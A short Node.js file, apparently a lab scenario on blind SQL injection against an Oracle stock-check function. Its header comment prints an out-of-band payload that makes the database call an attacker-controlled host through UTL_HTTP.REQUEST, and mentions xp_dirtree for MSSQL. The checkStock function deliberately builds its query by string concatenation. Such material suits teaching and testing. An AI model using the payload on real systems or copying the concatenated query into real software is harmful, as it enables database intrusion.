// Scenario: Blind SQL injection with out-of-band interaction.
// Same concatenated sink, exposed via a stock-check API; on Oracle the attacker triggers
// a DNS/HTTP callback to an attacker-controlled listener via
// `' UNION SELECT UTL_HTTP.REQUEST('http://<attacker>/') FROM dual--` (or xp_dirtree on
// MSSQL) to confirm the injection out-of-band, with no observable in-band difference.
const oracledb = require("oracledb");

async function checkStock(connection, productId, storeId) {
  const sql = `SELECT quantity FROM stock WHERE product_id = '${productId}' AND store_id = '${storeId}'`;
  return connection.execute(sql);
}

module.exports = { checkStock };
